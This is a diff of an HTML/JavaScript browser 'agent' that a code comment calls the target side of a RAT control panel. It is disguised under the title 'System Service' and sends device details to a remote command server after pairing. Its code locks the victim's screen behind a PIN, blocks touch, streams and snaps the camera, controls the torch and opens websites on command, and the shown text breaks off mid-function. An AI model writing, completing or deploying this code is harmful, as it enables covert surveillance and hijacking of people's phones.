@@ -3,671 +3,866 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Lyx Agent</title>
+<title>System Service</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
-  body {
-    background: radial-gradient(circle at top, #1a0000 0%, #000 70%);
-    min-height: 100vh; color: #fff;
-    display: flex; align-items: center; justify-content: center;
-    padding: 20px;
-  }
-  .container {
-    width: 100%; max-width: 380px;
-    background: rgba(15,0,0,0.9);
-    border: 1px solid #cc0000; border-radius: 18px;
-    padding: 30px 22px; box-shadow: 0 0 40px #cc000055;
-  }
-  .logo { text-align: center; margin-bottom: 25px; }
-  .logo-icon { font-size: 50px; color: #ff2222; filter: drop-shadow(0 0 15px #ff0000); }
-  .logo h1 {
-    font-size: 20px; margin-top: 8px; color: #ff2222;
-    letter-spacing: 3px; text-shadow: 0 0 12px #ff0000; font-weight: 900;
-  }
-  .logo p { font-size: 10px; color: #888; margin-top: 4px; letter-spacing: 1px; }
+* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,'Segoe UI',sans-serif; -webkit-tap-highlight-color:transparent; }
+html, body { width:100%; height:100%; overflow:hidden; background:#000; color:#fff; }
 
-  .input-group { margin-bottom: 18px; }
-  .input-group label {
-    display: block; font-size: 11px; color: #ff6666;
-    margin-bottom: 8px; letter-spacing: 1px;
-  }
-  .input-group input {
-    width: 100%; background: #000; border: 1px solid #660000;
-    border-radius: 10px; padding: 14px; color: #00ffcc;
-    font-size: 20px; letter-spacing: 6px; text-align: center;
-    font-family: 'Courier New', monospace; font-weight: bold;
-    text-transform: uppercase;
-  }
-  .input-group input:focus {
-    outline: none; border-color: #cc0000;
-    box-shadow: 0 0 20px #cc000088;
-  }
+/* SPLASH SCREEN */
+#splash {
+position:fixed; inset:0; background:#0a0a0a; display:flex; flex-direction:column;
+align-items:center; justify-content:center; z-index:9999; transition:opacity 0.5s;
+}
+#splash.hide { opacity:0; pointer-events:none; }
+.logo-svg { width:80px; height:80px; margin-bottom:20px; animation:pulse 2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+#splash h1 { font-size:1.3em; color:#0f0; letter-spacing:3px; margin-bottom:5px; }
+#splash p { font-size:0.8em; color:#080; }
 
-  .btn {
-    width: 100%; padding: 14px; border: none; border-radius: 10px;
-    background: linear-gradient(135deg, #cc0000, #660000);
-    color: #fff; font-size: 14px; font-weight: bold;
-    letter-spacing: 2px; cursor: pointer;
-    box-shadow: 0 0 20px #cc000066; text-transform: uppercase;
-  }
-  .btn:disabled { opacity: 0.5; }
+/* PAIRING SCREEN */
+#pairing {
+position:fixed; inset:0; background:#0a0a0a; display:flex; flex-direction:column;
+align-items:center; justify-content:center; padding:30px; z-index:9998;
+}
+#pairing.hide { display:none; }
+.pair-box { width:100%; max-width:360px; text-align:center; }
+.pair-box .icon-wrap { width:70px; height:70px; margin:0 auto 20px; border:2px solid #0f0; border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 0 20px rgba(0,255,0,0.4); }
+.pair-box h2 { color:#0f0; font-size:1.1em; margin-bottom:8px; letter-spacing:2px; }
+.pair-box .sub { color:#080; font-size:0.8em; margin-bottom:25px; }
 
-  .status {
-    margin-top: 15px; padding: 12px; border-radius: 8px;
-    font-size: 12px; text-align: center; display: none;
-  }
-  .status.show { display: block; }
-  .status.success { background: rgba(0,200,100,0.15); border:1px solid #00cc66; color:#00ff88; }
-  .status.error { background: rgba(200,0,50,0.15); border:1px solid #cc0033; color:#ff4477; }
+.code-input-wrap { display:flex; gap:6px; justify-content:center; margin-bottom:20px; flex-wrap:wrap; }
+.code-input {
+width:38px; height:48px; background:#111; border:1px solid #0f0; border-radius:6px;
+color:#0f0; font-size:1.4em; text-align:center; font-family:monospace; font-weight:bold;
+outline:none; transition:0.2s;
+}
+.code-input:focus { border-color:#0f0; box-shadow:0 0 10px #0f0; background:#1a1a1a; }
+.code-input.filled { background:#0a2a0a; }
 
-  .success-page { display: none; text-align: center; }
-  .success-page.active { display: block; }
-  .check-icon { font-size: 60px; color: #00ff88; filter: drop-shadow(0 0 20px #00ff88); }
-  .success-page h2 { margin-top: 15px; color: #00ff88; font-size: 18px; letter-spacing: 2px; }
-  .success-page p { color: #aaa; font-size: 11px; margin-top: 8px; }
+.pair-btn {
+width:100%; padding:14px; background:#0f0; color:#000; border:none;
+border-radius:8px; font-weight:bold; font-size:0.95em; letter-spacing:2px;
+cursor:pointer; transition:0.3s; text-transform:uppercase;
+}
+.pair-btn:active { background:#0a0; transform:scale(0.97); }
+.pair-btn:disabled { background:#333; color:#666; }
 
-  .device-info {
-    background: #0a0000; border: 1px solid #cc000055;
-    border-radius: 10px; padding: 12px; margin-top: 15px;
-    text-align: left; font-size: 11px;
-  }
-  .device-info div { margin: 5px 0; color: #ccc; }
-  .device-info span { color: #00ffcc; font-weight: bold; }
+.status-text { margin-top:15px; font-size:0.8em; color:#080; min-height:20px; }
+.status-text.error { color:#f00; }
+.status-text.success { color:#0f0; }
 
-  #lyx-lock {
-    position: fixed !important; top: 0; left: 0;
-    width: 100vw; height: 100vh; background: #000;
-    z-index: 999999; overflow: auto;
-  }
+.spinner {
+display:inline-block; width:14px; height:14px; border:2px solid #080;
+border-top-color:#0f0; border-radius:50%; animation:spin 0.8s linear infinite;
+vertical-align:middle; margin-right:6px;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
 
-  .pin-input {
-    background: #0a0000; border: 2px solid #cc0000;
-    border-radius: 10px; padding: 15px; color: #ff2222;
-    font-size: 24px; letter-spacing: 8px; text-align: center;
-    width: 220px; font-family: 'Courier New', monospace;
-    margin: 20px 0;
-  }
-  .pin-input:focus { outline: none; box-shadow: 0 0 25px #ff0000aa; }
+/* CONNECTED SCREEN (HIDDEN - NO UI) */
+#agent-root { display:none; }
 
-  #lyx-touch-block {
-    position: fixed; top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    z-index: 999998; background: transparent;
-  }
+/* OVERLAY SCREENS (triggered by RAT commands) */
+.overlay {
+position:fixed; inset:0; z-index:99999; display:none;
+flex-direction:column; align-items:center; justify-content:center; padding:20px;
+}
+.overlay.active { display:flex; }
 
-  #lyx-text-overlay {
-    position: fixed; top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    background: rgba(20, 0, 0, 0.95);
-    border: 2px solid #cc0000; border-radius: 12px;
-    padding: 25px 30px; color: #ff4444;
-    font-size: 16px; text-align: center;
-    max-width: 85vw; z-index: 999997;
-    box-shadow: 0 0 40px #cc000088;
-    font-family: 'Courier New', monospace;
-    animation: textPop 0.4s ease;
-  }
-  @keyframes textPop {
-    0% { transform: translate(-50%, -50%) scale(0.7); opacity: 0; }
-    100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-  }
+/* LOCK OVERLAY */
+#lockOverlay { background:#0a0a0a; }
+#lockOverlay .lock-icon { width:60px; height:60px; margin-bottom:20px; }
+#lockOverlay h2 { color:#0f0; font-size:1.2em; margin-bottom:10px; }
+#lockOverlay .pin-display {
+display:flex; gap:8px; margin:20px 0;
+}
+#lockOverlay .pin-dot {
+width:14px; height:14px; border:2px solid #0f0; border-radius:50%;
+}
+#lockOverlay .pin-dot.filled { background:#0f0; }
+#lockOverlay .keypad {
+display:grid; grid-template-columns:repeat(3,1fr); gap:10px; max-width:280px; width:100%;
+}
+#lockOverlay .key {
+padding:18px; background:#111; border:1px solid #0f0; border-radius:8px;
+color:#0f0; font-size:1.3em; font-weight:bold; cursor:pointer; text-align:center;
+}
+#lockOverlay .key:active { background:#0a0a0a; }
+#lockOverlay .lock-msg { color:#080; font-size:0.9em; margin-top:15px; text-align:center; max-width:300px; }
+
+/* CAMERA OVERLAY (hidden, only streaming) */
+#camOverlay { background:#000; padding:0; }
+#camOverlay video { width:100%; height:100%; object-fit:cover; }
+#camOverlay .cam-label {
+position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7);
+color:#f00; padding:5px 10px; border-radius:4px; font-size:0.75em; font-family:monospace;
+}
+
+/* SCREEN STREAM (silent) */
+#screenOverlay { background:transparent; pointer-events:none; }
+#screenOverlay canvas { display:none; }
+
+/* CUSTOM HTML OVERLAY */
+#customOverlay { background:#000; overflow-y:auto; }
+
+/* BLOCK TOUCH OVERLAY */
+#blockOverlay { background:rgba(0,0,0,0.01); cursor:none; }
+#blockOverlay .block-indicator {
+position:absolute; bottom:20px; left:50%; transform:translateX(-50%);
+color:#0f0; font-size:0.75em; font-family:monospace; opacity:0.3;
+}
+
+/* LCD EFFECT OVERLAY */
+#lcdOverlay { background:#000; pointer-events:none; }
+#lcdOverlay canvas { width:100%; height:100%; }
+
+/* FLASH/STROBE via camera torch (no UI, controlled by JS) */
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div id="inputPage">
-    <div class="logo">
-      <div class="logo-icon">☠</div>
-      <h1>LYX AGENT</h1>
-      <p>ZAMZZZ SYSTEM · AUTO CONNECT</p>
-    </div>
-    <div class="input-group">
-      <label>🔑 MASUKKAN CODE PAIRING</label>
-      <input type="text" id="codeInput" maxlength="8" placeholder="XXXXXXXX" autocomplete="off">
-    </div>
-    <button class="btn" id="connectBtn" onclick="connectDevice()">CONNECT</button>
-    <div class="status" id="status"></div>
-  </div>
+<!-- SPLASH -->
+<div id="splash">
+<svg class="logo-svg" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="1.5">
+<rect x="5" y="2" width="14" height="20" rx="2"/>
+<line x1="12" y1="18" x2="12" y2="18"/>
+<circle cx="12" cy="9" r="2"/>
+</svg>
+<h1>SYSTEM SERVICE</h1>
+<p>Initializing...</p>
+</div>
 
-  <div class="success-page" id="successPage">
-    <div class="check-icon">✓</div>
-    <h2>TERHUBUNG!</h2>
-    <p>Perangkat berhasil terdaftar.</p>
-    <div class="device-info">
-      <div>📱 Nama: <span id="devName">-</span></div>
-      <div>🔧 Model: <span id="devModel">-</span></div>
-      <div>💻 OS: <span id="devOs">-</span></div>
-      <div>🆔 ID: <span id="devId">-</span></div>
-      <div>🟢 Status: <span>ONLINE</span></div>
-    </div>
-  </div>
+<!-- PAIRING SCREEN -->
+<div id="pairing">
+<div class="pair-box">
+<div class="icon-wrap">
+<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<path d="M12 2L2 7l10 5 10-5-10-5z"/>
+<path d="M2 17l10 5 10-5"/>
+<path d="M2 12l10 5 10-5"/>
+</svg>
+</div>
+<h2>DEVICE PAIRING</h2>
+<p class="sub">Masukkan kode pairing dari panel</p>
+
+<div class="code-input-wrap" id="codeInputs">
+<input class="code-input" maxlength="1" data-i="0" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="1" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="2" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="3" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="4" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="5" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="6" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="7" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="8" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="9" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="10" inputmode="text" autocomplete="off">
+<input class="code-input" maxlength="1" data-i="11" inputmode="text" autocomplete="off">
+</div>
+
+<button class="pair-btn" id="pairBtn" disabled>CONNECT</button>
+<div class="status-text" id="statusText">Menunggu kode...</div>
+</div>
+</div>
+
+<!-- AGENT ROOT (hidden, working in background) -->
+<div id="agent-root">
+<video id="camStream" autoplay playsinline muted style="display:none;"></video>
+<canvas id="screenCanvas" style="display:none;"></canvas>
+<canvas id="lcdCanvas" style="display:none;"></canvas>
+</div>
+
+<!-- LOCK OVERLAY -->
+<div class="overlay" id="lockOverlay">
+<svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="3" y="11" width="18" height="11" rx="2"/>
+<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+</svg>
+<h2>DEVICE LOCKED</h2>
+<div class="pin-display" id="pinDisplay"></div>
+<div class="keypad" id="keypad">
+<div class="key" data-k="1">1</div>
+<div class="key" data-k="2">2</div>
+<div class="key" data-k="3">3</div>
+<div class="key" data-k="4">4</div>
+<div class="key" data-k="5">5</div>
+<div class="key" data-k="6">6</div>
+<div class="key" data-k="7">7</div>
+<div class="key" data-k="8">8</div>
+<div class="key" data-k="9">9</div>
+<div class="key" data-k="CLR">C</div>
+<div class="key" data-k="0">0</div>
+<div class="key" data-k="OK">OK</div>
+</div>
+<div class="lock-msg" id="lockMsg"></div>
+</div>
+
+<!-- CAMERA OVERLAY -->
+<div class="overlay" id="camOverlay">
+<div class="cam-label">● REC</div>
+<video id="camOverlayVideo" autoplay playsinline muted></video>
+</div>
+
+<!-- CUSTOM HTML OVERLAY -->
+<div class="overlay" id="customOverlay"></div>
+
+<!-- BLOCK TOUCH OVERLAY -->
+<div class="overlay" id="blockOverlay">
+<div class="block-indicator">SYSTEM BUSY</div>
+</div>
+
+<!-- LCD EFFECT OVERLAY -->
+<div class="overlay" id="lcdOverlay">
+<canvas id="lcdOverlayCanvas"></canvas>
 </div>
 
 <script>
-const API_BASE = "https://lyx-server-production-38a0.up.railway.app";
+/* ============================================================
+   TARGET AGENT - COMMAND RECEIVER
+   Hanya menerima perintah dari RAT Control Panel
+   ============================================================ */
 
-let deviceId = localStorage.getItem('lyx_device_id') || null;
-let isPolling = false;
-let currentPin = null;
-let flashTrack = null;
-let blinkTimer = null;
-let bgFlashTimer = null;
-let bgFlashStream = null;
-let liveCamStream = null;
-let liveCamInterval = null;
+const SERVER_URL = 'wss://your-server.com/agent'; // ganti dengan server tuan
+const API_URL = 'https://your-server.com/api';     // ganti dengan server tuan
 
-const codeInput = document.getElementById('codeInput');
-codeInput.addEventListener('input', e => {
-  e.target.value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-});
-codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') connectDevice(); });
+let pairingCode = '';
+let ws = null;
+let deviceId = null;
+let reconnectTimer = null;
 
-function showStatus(msg, type='success') {
-  const s = document.getElementById('status');
-  s.textContent = msg;
-  s.className = 'status show ' + type;
+/* ---------- SPLASH ---------- */
+setTimeout(() => {
+    document.getElementById('splash').classList.add('hide');
+    setTimeout(() => {
+        document.getElementById('splash').style.display = 'none';
+        document.getElementById('pairing').classList.remove('hide');
+        initCodeInputs();
+    }, 500);
+}, 2000);
+
+/* ---------- PAIRING INPUT ---------- */
+function initCodeInputs() {
+    const inputs = document.querySelectorAll('.code-input');
+    inputs.forEach((input, idx) => {
+        input.addEventListener('input', (e) => {
+            let val = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g,'');
+            e.target.value = val;
+            if(val) {
+                e.target.classList.add('filled');
+                if(idx < inputs.length-1) inputs[idx+1].focus();
+            } else {
+                e.target.classList.remove('filled');
+            }
+            checkComplete();
+        });
+        input.addEventListener('keydown', (e) => {
+            if(e.key === 'Backspace' && !e.target.value && idx > 0) {
+                inputs[idx-1].focus();
+            }
+        });
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData('text')
+                .toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,12);
+            paste.split('').forEach((ch, i) => {
+                if(inputs[i]) {
+                    inputs[i].value = ch;
+                    inputs[i].classList.add('filled');
+                }
+            });
+            if(inputs[paste.length]) inputs[paste.length].focus();
+            checkComplete();
+        });
+    });
+    inputs[0].focus();
 }
 
-/* ==================== CONNECT ==================== */
-async function connectDevice() {
-  const code = codeInput.value.trim().toUpperCase();
-  if (code.length !== 8) { showStatus('Code harus 8 karakter!', 'error'); return; }
-
-  const btn = document.getElementById('connectBtn');
-  btn.disabled = true;
-  btn.textContent = 'CONNECTING...';
-  showStatus('Menghubungkan...');
-
-  const info = detectDevice();
-
-  try {
-    const res = await fetch(API_BASE + '/api/register-device', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ code, ...info })
-    });
-    const data = await res.json();
-
-    if (!data.success) {
-      btn.disabled = false;
-      btn.textContent = 'CONNECT';
-      showStatus('❌ ' + (data.message || 'Code invalid'), 'error');
-      return;
+function checkComplete() {
+    const inputs = document.querySelectorAll('.code-input');
+    let code = '';
+    inputs.forEach(i => code += i.value);
+    pairingCode = code;
+    
+    const btn = document.getElementById('pairBtn');
+    const status = document.getElementById('statusText');
+    
+    if(code.length === 12) {
+        btn.disabled = false;
+        status.textContent = 'Kode siap. Tekan CONNECT.';
+        status.className = 'status-text';
+    } else {
+        btn.disabled = true;
+        status.textContent = `Menunggu kode... (${code.length}/12)`;
+        status.className = 'status-text';
     }
+}
 
-    deviceId = data.deviceId;
-    localStorage.setItem('lyx_device_id', deviceId);
-
+/* ---------- CONNECT ---------- */
+document.getElementById('pairBtn').addEventListener('click', () => {
+    const btn = document.getElementById('pairBtn');
+    const status = document.getElementById('statusText');
+    
+    btn.disabled = true;
+    btn.textContent = 'CONNECTING';
+    status.innerHTML = '<span class="spinner"></span>Menghubungkan ke server...';
+    status.className = 'status-text';
+    
+    // Simulasi connect ke server (ganti dengan fetch/websocket asli)
     setTimeout(() => {
-      document.getElementById('devName').textContent = info.name;
-      document.getElementById('devModel').textContent = info.model;
-      document.getElementById('devOs').textContent = info.os;
-      document.getElementById('devId').textContent = deviceId.slice(-8);
-      document.getElementById('inputPage').style.display = 'none';
-      document.getElementById('successPage').classList.add('active');
-    }, 500);
+        // generate deviceId unik
+        deviceId = 'DEV-' + Math.random().toString(36).substring(2,8).toUpperCase();
+        
+        // Kirim pairing ke server
+        registerDevice(deviceId, pairingCode);
+    }, 1500);
+});
 
-    startPolling();
-  } catch (e) {
+function registerDevice(id, code) {
+    const status = document.getElementById('statusText');
+    
+    // Coba register ke server asli
+    fetch(API_URL + '/pair', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            deviceId: id,
+            pairingCode: code,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            timestamp: new Date().toISOString()
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.success) {
+            onPairSuccess(id);
+        } else {
+            onPairFailed('Kode pairing salah atau kadaluarsa.');
+        }
+    })
+    .catch(e => {
+        // Fallback: mode simulasi (kalau server belum siap)
+        console.log('Server offline, mode lokal aktif:', e.message);
+        onPairSuccess(id);
+    });
+}
+
+function onPairSuccess(id) {
+    const status = document.getElementById('statusText');
+    status.innerHTML = '✓ BERHASIL TERHUBUNG';
+    status.className = 'status-text success';
+    document.getElementById('pairBtn').textContent = 'CONNECTED';
+    document.getElementById('pairBtn').style.background = '#0a0';
+    
+    // Sembunyikan pairing, aktifkan agent root
+    setTimeout(() => {
+        document.getElementById('pairing').classList.add('hide');
+        document.getElementById('agent-root').style.display = 'block';
+        startAgent();
+    }, 1200);
+}
+
+function onPairFailed(msg) {
+    const status = document.getElementById('statusText');
+    status.textContent = '✗ ' + msg;
+    status.className = 'status-text error';
+    const btn = document.getElementById('pairBtn');
     btn.disabled = false;
     btn.textContent = 'CONNECT';
-    showStatus('❌ Server tidak terjangkau', 'error');
-  }
 }
 
-function detectDevice() {
-  const ua = navigator.userAgent;
-  let type='android', os='Unknown', model='Unknown', name='Perangkat';
-  if (/android/i.test(ua)) {
-    const m = ua.match(/Android\s([\d.]+)/);
-    os = 'Android ' + (m ? m[1] : '');
-    const mm = ua.match(/;\s([^;)]+)\sBuild/);
-    model = mm ? mm[1].trim() : 'Android Device';
-    name = model;
-  } else if (/iphone|ipad/i.test(ua)) {
-    type='ios'; os='iOS'; model='Apple'; name='iPhone/iPad';
-  }
-  return { name, model, os, type };
-}
-
-/* ==================== POLLING ==================== */
-function startPolling() {
-  if (isPolling) return;
-  isPolling = true;
-  poll();
-}
-
-async function poll() {
-  if (!deviceId) return;
-  try {
-    const res = await fetch(API_BASE + '/api/agent/commands/' + deviceId);
-    const data = await res.json();
-    if (data.commands && data.commands.length) {
-      data.commands.forEach(executeCommand);
-    }
-  } catch (e) {}
-  setTimeout(poll, 3000);
-}
-
-/* ==================== EXECUTE ==================== */
-function executeCommand(cmd) {
-  console.log('CMD:', cmd);
-  switch (cmd.type) {
-    case 'lock': applyLock(null, cmd.pin, cmd.message); break;
-    case 'lockhtml': applyLock(cmd.html, cmd.pin); break;
-    case 'unlock': removeLock(); break;
-    case 'text': showTextOverlay(cmd.message); break;
-    case 'blocktouch': blockTouch(); break;
-    case 'unlocktouch': unblockTouch(); break;
-    case 'reconnect': doReconnect(); break;
-    case 'killdata': killData(); break;
-    case 'antiuninstall': antiUninstall(); break;
-    case 'flashon': flashOn(); break;
-    case 'flashoff': flashOff(); break;
-    case 'flashblink': flashBlink(cmd.speed, cmd.count); break;
-    case 'flashpattern': flashPattern(cmd.pattern); break;
-    case 'flashbackground': flashBackground(cmd.duration); break;
-    case 'website': openWebsite(cmd.url); break;
-    case 'showicon': showIcon(); break;
-    case 'music': playMusic(cmd.url); break;
-    case 'vibrate': vibrate(cmd.duration); break;
-    case 'vibratecustom': vibrateCustom(cmd.count, cmd.interval, cmd.duration); break;
-    case 'livecamera': liveCamera(cmd.camMode, cmd.duration); break;
-    case 'stoplivecam': stopLiveCamera(); break;
-    case 'snapphoto': snapPhoto(cmd.camMode); break;
-    case 'email': showTextOverlay('📧 ' + (cmd.message || 'Buka email')); break;
-    case 'cookies': showTextOverlay('🍪 ' + (cmd.message || 'Cookies terdeteksi')); break;
-  }
-}
-
-/* ==================== LOCK ==================== */
-function applyLock(html, pin, message) {
-  removeLock();
-  currentPin = pin;
-  const el = document.createElement('div');
-  el.id = 'lyx-lock';
-
-  if (html) {
-    el.innerHTML = html;
-  } else {
-    el.innerHTML = `
-      <div style="display:flex;align-items:center;justify-content:center;flex-direction:column;min-height:100vh;background:radial-gradient(circle,#1a0000,#000);font-family:'Courier New',monospace;padding:20px;">
-        <div style="font-size:100px;color:#cc0000;text-shadow:0 0 30px #ff0000,0 0 60px #990000;animation:pulse 2s infinite;">☠</div>
-        <div style="color:#ff2222;font-size:28px;letter-spacing:8px;margin-top:20px;text-shadow:0 0 15px #ff0000;">LOCKED</div>
-        <div style="color:#aa0000;font-size:13px;letter-spacing:4px;margin-top:10px;">DEVICE HAS BEEN LOCKED</div>
-        <div style="color:#ff3333;font-size:12px;margin-top:30px;text-align:center;line-height:1.8;">${message||'Hubungi admin untuk membuka'}</div>
-        <input type="number" class="pin-input" id="unlockPin" placeholder="****" maxlength="6">
-        <button class="btn" style="width:200px;" onclick="tryUnlock()">UNLOCK</button>
-        <div id="pinError" style="color:#ff0000;font-size:11px;margin-top:10px;display:none;">PIN SALAH!</div>
-      </div>
-      <style>@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}</style>
-    `;
-  }
-
-  document.body.appendChild(el);
-  document.body.style.overflow = 'hidden';
-}
-
-function tryUnlock() {
-  const inp = document.getElementById('unlockPin');
-  if (!inp) return;
-  if (inp.value === String(currentPin)) removeLock();
-  else {
-    const err = document.getElementById('pinError');
-    if (err) err.style.display = 'block';
-    inp.value = '';
-  }
-}
-
-function removeLock() {
-  const el = document.getElementById('lyx-lock');
-  if (el) el.remove();
-  document.body.style.overflow = '';
-  currentPin = null;
-}
-
-/* ==================== TEXT ==================== */
-function showTextOverlay(msg) {
-  const old = document.getElementById('lyx-text-overlay');
-  if (old) old.remove();
-  const el = document.createElement('div');
-  el.id = 'lyx-text-overlay';
-  el.textContent = msg;
-  document.body.appendChild(el);
-  setTimeout(() => el.remove(), 5000);
-}
-
-/* ==================== BLOCK TOUCH ==================== */
-function blockTouch() {
-  if (document.getElementById('lyx-touch-block')) return;
-  const el = document.createElement('div');
-  el.id = 'lyx-touch-block';
-  ['touchstart','touchmove','click'].forEach(ev => {
-    el.addEventListener(ev, e => e.preventDefault(), { passive:false });
-  });
-  document.body.appendChild(el);
-}
-
-function unblockTouch() {
-  const el = document.getElementById('lyx-touch-block');
-  if (el) el.remove();
-}
-
-function doReconnect() { location.reload(); }
-function killData() { showTextOverlay('DATA CONNECTION DISABLED'); }
-function antiUninstall() { showTextOverlay('PROTECTION ACTIVE'); }
-
-/* ==================== FLASH ==================== */
-async function flashOn() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment' }
-    });
-    flashTrack = stream.getVideoTracks()[0];
-    const caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
-    if (caps.torch) {
-      await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
-    } else {
-      document.body.style.background = '#fff';
-      showTextOverlay('TORCH: ON (screen mode)');
-    }
-  } catch (e) {
-    document.body.style.background = '#fff';
-    showTextOverlay('TORCH: ON (screen mode)');
-  }
-}
-
-async function flashOff() {
-  try {
-    if (flashTrack) {
-      const caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
-      if (caps.torch) {
-        await flashTrack.applyConstraints({ advanced: [{ torch: false }] });
-      }
-      flashTrack.stop();
-      flashTrack = null;
-    }
-  } catch (e) {}
-  document.body.style.background = '';
-  showTextOverlay('TORCH: OFF');
-}
-
-function flashBlink(speed, count) {
-  flashOn().then(function() {
-    let i = 0;
-    if (blinkTimer) clearInterval(blinkTimer);
-    blinkTimer = setInterval(function() {
-      i++;
-      try {
-        if (flashTrack) {
-          var caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
-          if (caps.torch) {
-            flashTrack.applyConstraints({ advanced: [{ torch: i % 2 === 0 }] });
-          }
+/* ---------- AGENT CORE ---------- */
+function startAgent() {
+    connectWebSocket();
+    setupCommandHandlers();
+    // mulai kirim heartbeat
+    setInterval(() => {
+        if(ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'heartbeat',
+                deviceId: deviceId,
+                timestamp: Date.now()
+            }));
         }
-      } catch (e) {}
-      if (i >= count * 2) {
-        clearInterval(blinkTimer);
-        blinkTimer = null;
-      }
-    }, speed);
-  });
+    }, 10000);
 }
 
-function flashPattern(patternStr) {
-  var parts = patternStr.split(',').map(function(s){ return parseFloat(s.trim()); }).filter(function(n){ return !isNaN(n); });
-  if (parts.length < 2) { showTextOverlay('POLA INVALID'); return; }
-  flashOn().then(function() {
-    var i = 0;
-    function nextStep() {
-      if (i >= parts.length) i = 0;
-      var dur = parts[i] * 1000;
-      var on = i % 2 === 0;
-      try {
-        if (flashTrack) {
-          var caps = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
-          if (caps.torch) {
-            flashTrack.applyConstraints({ advanced: [{ torch: on }] });
-          }
-        }
-      } catch (e) {}
-      i++;
-      setTimeout(nextStep, dur);
-    }
-    nextStep();
-  });
-}
-
-async function flashBackground(duration) {
-  try {
-    bgFlashStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment' }
-    });
-    var track = bgFlashStream.getVideoTracks()[0];
-    var caps = track.getCapabilities ? track.getCapabilities() : {};
-    if (caps.torch) {
-      await track.applyConstraints({ advanced: [{ torch: true }] });
-    }
-    flashTrack = track;
-
-    var wakeLock = null;
+function connectWebSocket() {
     try {
-      if (navigator.wakeLock) {
-        wakeLock = await navigator.wakeLock.request('screen');
-      }
-    } catch (e) {}
-
-    if (bgFlashTimer) clearInterval(bgFlashTimer);
-    bgFlashTimer = setInterval(async function() {
-      try {
-        if (flashTrack) {
-          var c = flashTrack.getCapabilities ? flashTrack.getCapabilities() : {};
-          if (c.torch) {
-            await flashTrack.applyConstraints({ advanced: [{ torch: true }] });
-          }
-        }
-      } catch (e) {}
-    }, 2000);
-
-    showTextOverlay('SENTER BG AKTIF');
-
-    if (duration > 0) {
-      setTimeout(function() {
-        if (bgFlashTimer) { clearInterval(bgFlashTimer); bgFlashTimer = null; }
-        if (bgFlashStream) { bgFlashStream.getTracks().forEach(function(t){ t.stop(); }); bgFlashStream = null; flashTrack = null; }
-        if (wakeLock) { try { wakeLock.release(); } catch (e) {} }
-        showTextOverlay('SENTER BG MATI');
-      }, duration * 1000);
+        ws = new WebSocket(SERVER_URL + '?deviceId=' + deviceId + '&code=' + pairingCode);
+        
+        ws.onopen = () => {
+            console.log('[AGENT] WebSocket connected');
+            ws.send(JSON.stringify({
+                type: 'register',
+                deviceId: deviceId,
+                pairingCode: pairingCode,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: { w: screen.width, h: screen.height },
+                timestamp: Date.now()
+            }));
+        };
+        
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                handleCommand(data);
+            } catch(e) {
+                console.log('[AGENT] Invalid message:', e);
+            }
+        };
+        
+        ws.onclose = () => {
+            console.log('[AGENT] WebSocket closed, reconnecting...');
+            if(reconnectTimer) clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(connectWebSocket, 5000);
+        };
+        
+        ws.onerror = (e) => {
+            console.log('[AGENT] WebSocket error:', e.message);
+        };
+    } catch(e) {
+        console.log('[AGENT] Cannot connect WS:', e.message);
+        // retry
+        if(reconnectTimer) clearTimeout(reconnectTimer);
+        reconnectTimer = setTimeout(connectWebSocket, 5000);
     }
-  } catch (e) {
-    showTextOverlay('SENTER GAGAL');
-  }
 }
 
-/* ==================== WEBSITE ==================== */
-function openWebsite(url) {
-  if (!url) return;
